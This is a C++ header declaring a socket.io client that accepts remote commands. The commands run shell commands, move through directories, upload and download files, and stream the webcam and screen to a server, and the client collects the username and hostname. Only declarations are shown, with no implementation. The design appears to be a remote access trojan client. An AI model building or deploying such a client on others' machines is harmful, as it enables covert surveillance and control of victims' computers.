#pragma once

#include <fstream>
#include <functional>
#include <future>
#include <iterator>
#include <utility>

#include <sio_client.h>
#include <sio_message.h>
#include <sio_socket.h>
#include <httplib.h>

#include <core/Util.h>

namespace silence {
    class Client {
    public:
        using CommandObject = std::map<std::string, sio::message::ptr>;

        explicit Client(std::string url);

        ~Client();

        void connect();

    private:
        void onConnected(const std::string &nsp);

        void onFailed();

        void onClosed(sio::client::close_reason const &reason);

    private:
        sio::message::list createObject(const CommandObject &object);

        template<typename T, typename... Args>
        void launchEvent(const std::function<T> &callable, Args &&... args);

        bool stopStream(std::unique_lock<std::mutex> &lockGuard) const;

        void camStream(std::unique_lock<std::mutex> &lockGuard);

        void screenStream(std::unique_lock<std::mutex> &lockGuard);

    private:
        void onCommand(std::string const &name, sio::message::ptr const &data,
                       bool hasAck, sio::message::list &ack_resp);

    private:
        void greetEvent(); // starts the client
        void kstreamEvent(); // kills a stream

        void streamEvent(const CommandObject &object); // creates a stream
        void cdEvent(const CommandObject &object); // changes the current directory
        void originEvent(const CommandObject &object); // returns the install directory
        void cmdEvent(const CommandObject &object); // executes a cmd command
        void uploadEvent(const CommandObject &object); // uploads file to http server
        void downloadEvent(const CommandObject &object); // downloads file from http server

        void response(const std::string &event, const sio::message::list &msg);

    private:
        std::string mUrl;
        std::unique_ptr<sio::client> mIO;
        std::mutex mLock;
        std::mutex mStreamLocker;

        std::condition_variable_any mCond;
        bool mStreamRunning{false};

        sio::socket::ptr mSocket;
        httplib::Client mHttpClient;

    private:
        std::string mInstallDirectory;
        std::string mUsername;
        std::string mHostname;

#if defined(__linux__)
        std::string mOS{"Linux"};
#elif defined(_WIN32)
        std::string mOS { "Windows" };
#else
        std::string mOS { "MacOS" };
#endif
    };
} // namespace silence